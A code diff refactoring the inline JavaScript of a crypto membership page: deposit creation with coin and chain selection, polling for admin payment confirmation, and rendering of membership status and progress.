+closeModal.addEventListener('click', ()=> { modal.classList.remove('show'); stopPolling(); });
+modal.addEventListener('click', (e)=> { if(e.target === modal) { modal.classList.remove('show'); stopPolling(); } });
+
+/* Create deposit (membership) */
+createDepositBtn.addEventListener('click', async ()=>{
+  if(!selectedTier) return alert('No tier selected');
   const coin = coinSel.value;
-  const amount = TIERS[selectedTier].deposit;
-  try{
+  const chain = chainSel.value;
+  if(!chain) return alert('Please select a chain/network');
+
+  // prevent duplicate pending for same tier
+  if(pendingTxByTier[selectedTier]) return alert('A pending payment already exists for this tier.');
+
+  createDepositBtn.disabled = true;
+  createDepositBtn.classList.add('disabledBtn');
+  const prevText = createDepositBtn.innerText;
+  createDepositBtn.innerText = 'Creating...';
+
+  try {
+    const amount = TIERS[selectedTier].deposit;
     const res = await fetch(`${API_BASE}/api/deposit`, {
       method:'POST', credentials:'include', headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ coin, amount, membershipTier:selectedTier, isMembership:true })
+      body: JSON.stringify({ coin, chain, amount, membershipTier: selectedTier, isMembership: true })
     });
-    const data = await res.json();
-    if(!res.ok || !data.ok) throw new Error(data.error || "Deposit failed");
-    const txId = data.txId;
+    const j = await res.json();
+    if(!res.ok || !j.ok) throw new Error(j.error || 'Deposit creation failed');
+
+    const txId = j.txId;
     pendingTxByTier[selectedTier] = txId;
-    txInfo.innerHTML = `Pending tx created.<br>Tx: ${txId}`;
-    startPollingFor(txId, selectedTier);
-  }catch(err){ console.error("membership deposit err:", err); txInfo.innerText = err.message || "Failed to create deposit"; }
-  createDepositBtn.disabled = false; createDepositBtn.innerText = prev;
-};
-checkStatusBtn.onclick = ()=> checkStatus();
-function startPollingFor(txId, tier){ stopPolling(); pollingTier = tier; pollTimer = setInterval(()=> checkStatus(txId,tier), 8000); checkStatus(txId,tier); }
-function stopPolling(){ if(pollTimer){ clearInterval(pollTimer); pollTimer=null; } }
+    txInfo.innerHTML = `Pending tx created: <span style="font-family:monospace">${txId}</span>`;
+    startPolling(txId, selectedTier);
+  } catch (e) {
+    alert(e.message || 'Failed to create deposit');
+    console.error(e);
+  } finally {
+    createDepositBtn.disabled = false;
+    createDepositBtn.classList.remove('disabledBtn');
+    createDepositBtn.innerText = prevText;
+    renderCards();
+  }
+});
+
+/* ---------------- POLLING / VERIFY PAYMENT ---------------- */
+function startPolling(txId, tier){
+  stopPolling();
+  pollingFor = { txId, tier };
+  pollingTimer = setInterval(()=> checkStatus(txId, tier), 8000);
+  checkStatus(txId, tier);
+}
+
+function stopPolling(){
+  if(pollingTimer){ clearInterval(pollingTimer); pollingTimer = null; pollingFor = null; }
+}
+
 async function checkStatus(txId=null, tier=null){
-  if(!txId){ if(!pollingTier) return; tier = pollingTier; txId = pendingTxByTier[tier]; }
+  if(!txId && pollingFor) { txId = pollingFor.txId; tier = pollingFor.tier; }
   if(!txId) return;
-  try{
-    const res = await fetch(`${API_BASE}/api/verify-payment`,{ method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({txId}) });
-    const data = await res.json();
-    if(data.status==='CONFIRMED'){
-      txInfo.innerHTML = `<span style="color:#7ef6b8;font-weight:800">✓ Admin confirmed ${tier}</span>`;
+  try {
+    const res = await fetch(`${API_BASE}/api/verify-payment`, {
+      method:'POST', credentials:'include', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ txId })
+    });
+    const j = await res.json();
+    if(j.status === 'CONFIRMED'){
+      txInfo.innerHTML = `<span style="color:var(--success);font-weight:800">✓ Admin confirmed ${tier}</span>`;
       delete pendingTxByTier[tier];
       stopPolling();
       await refreshProfile();
-      setTimeout(()=> modal.classList.remove('show'),1200);
-    } else if(data.status==='PENDING'){ txInfo.innerText = `Status: Pending (${tier})`; }
-    else if(data.status==='DECLINED'){ txInfo.innerText = `Declined for ${tier}`; delete pendingTxByTier[tier]; stopPolling(); renderCards(); }
-    else { txInfo.innerText = "Status: " + (data.status || "Unknown"); }
-  }catch(e){ console.error("verify-payment error:", e); txInfo.innerText = "Error checking status"; }
+      await loadWalletTotal();
+      setTimeout(()=> modal.classList.remove('show'), 900);
+      renderCards();
+    } else if(j.status === 'PENDING'){
+      txInfo.innerText = `Status: Pending (${tier})`;
+    } else if(j.status === 'DECLINED'){
+      txInfo.innerHTML = `<span style="color:var(--danger)">✕ Declined</span>`;
+      delete pendingTxByTier[tier];
+      stopPolling();
+      renderCards();
+    } else {
+      txInfo.innerText = `Status: ${j.status || 'Unknown'}`;
+    }
+  } catch(e){
+    console.error('verify-payment error', e);
+    txInfo.innerText = 'Error checking status';
+  }
 }
 
-// PROFILE RENDER (updated to use memberships array from DB)
-async function refreshProfile(){ const res = await fetch(`${API_BASE}/api/profile`, {credentials:'include'}); const j = await res.json(); profileUser = j.user; renderProfile(j.user); await loadWalletUSD(); }
-function renderProfile(user){
-  const memberships = user.memberships || [];
-  // sidebar status top shows count/summary
-  const activeCount = memberships.filter(m => m.status === 'ACTIVE').length;
-  const pendingCount = memberships.filter(m => m.status === 'PENDING').length;
+checkStatusBtn.addEventListener('click', ()=> {
+  if(pollingFor) checkStatus(pollingFor.txId, pollingFor.tier);
+  else {
+    // try to check for selectedTier's pending
+    const tx = pendingTxByTier[selectedTier];
+    if(tx) checkStatus(tx, selectedTier);
+    else txInfo.innerText = 'No pending tx to check';
+  }
+});
+
+/* ---------------- PROFILE / LOAD ---------------- */
+async function refreshProfile(){
+  try {
+    const res = await fetch(`${API_BASE}/api/profile`, { credentials:'include' });
+    if(!res.ok) { location.href='login.html'; return; }
+    const j = await res.json();
+    profileUser = j.user;
+    renderProfile();
+  } catch(e){ console.error('refresh profile error', e); }
+}
+
+function renderProfile(){
+  const memberships = Array.isArray(profileUser.memberships) ? profileUser.memberships : [];
+  const activeCount = memberships.filter(m=>m.status==='ACTIVE').length;
+  const pendingCount = memberships.filter(m=>m.status==='PENDING').length;
   memStatus.innerText = `${activeCount} Active · ${pendingCount} Pending`;
-  memBadge.textContent = "MEMBERSHIPS";
-  memBadge.className = "pill live";
+  memBadge.textContent = 'MEMBERSHIPS';
+  memBadge.className = 'pill live';
+  memDetails.innerText = `You have ${memberships.length} membership record(s). Completed memberships are hidden from the main list.`;
 
-  // memDetails: show a brief note
-  memDetails.innerHTML = `You have ${memberships.length} membership record(s). Completed memberships are hidden from the main list.`;
-
-  // progress bar: show aggregated progress for display (optional)
-  const totals = memberships.reduce((acc,m) => {
+  // aggregate progress
+  const totals = memberships.reduce((acc,m)=>{
     if(!m || !m.durationDays) return acc;
     if(m.status === 'COMPLETED') return acc;
-    acc.daysPaid += (m.daysPaid || 0);
-    acc.totalDays += (m.durationDays || 0);
+    acc.daysPaid += (m.daysPaid||0);
+    acc.totalDays += (m.durationDays||0);
     return acc;
   }, { daysPaid:0, totalDays:0 });
-  if(totals.totalDays > 0){
-    const pct = Math.max(0, Math.min(100, (totals.daysPaid / totals.totalDays) * 100));
-    memProgressWrap.style.display = "block";
-    requestAnimationFrame(()=>{ memProgress.style.width = pct.toFixed(1) + "%"; });
+
+  if(totals.totalDays>0){
+    const pct = Math.max(0,Math.min(100,(totals.daysPaid / totals.totalDays) * 100));
+    memProgressWrap.style.display = 'block';
+    requestAnimationFrame(()=> memProgress.style.width = pct.toFixed(1) + '%');
   } else {
-    memProgressWrap.style.display = "none";
+    memProgressWrap.style.display = 'none';
   }
 
-  // update membership sidebar list (active + pending)
-  renderMembershipSidebar();
+  // membership sidebar
+  membershipsList.innerHTML = '';
+  const visible = memberships.filter(m => m.status==='ACTIVE' || m.status==='PENDING');
+  if(visible.length === 0) {
+    membershipsList.innerHTML = `<div style="color:var(--muted)">No active or pending memberships</div>`;
+  } else {
+    visible.forEach(m=>{
+      const item = document.createElement('div');
+      item.className = 'membership-item';
+      const days = `${m.daysPaid||0}/${m.durationDays||0}`;
+      item.innerHTML = `<div>${m.tier} · ${m.status}</div><div style="font-weight:600;color:var(--muted)">${days}</div>`;
+      membershipsList.appendChild(item);
+    });
+  }
 
-  // re-render cards to reflect any active/pending membership per tier
+  // render main cards
   renderCards();
 }
 
-function renderMembershipSidebar(){
-  membershipsList.innerHTML = '';
-  const memberships = (profileUser && Array.isArray(profileUser.memberships)) ? profileUser.memberships : [];
-  // Show active and pending (hide completed per Q3:B)
-  const visible = memberships.filter(m => m.status === 'ACTIVE' || m.status === 'PENDING');
-  if(visible.length === 0){
-    membershipsList.innerHTML = `<div style="color:var(--muted)">No active or pending memberships</div>`;
-    return;
-  }
-  visible.forEach(m => {
-    const item = document.createElement('div');
-    item.className = 'membership-item';
-    const days = `${m.daysPaid || 0}/${m.durationDays || 0}`;
-    item.innerHTML = `<div>${m.tier} · ${m.status}</div><div style="font-weight:600;color:var(--muted)">${days}</div>`;
-    membershipsList.appendChild(item);
-  });
-}
-
-// initial render if profileUser already set
-if(profileUser) renderMembershipSidebar();
+/* ---------------- BOOT ---------------- */
+(async function init(){
+  const ok = await ensureLoggedIn();
+  if(!ok) return;
+  await refreshProfile();
+  await loadWalletTotal();
+  renderCards();
+})();
 
 </script>
 </body>
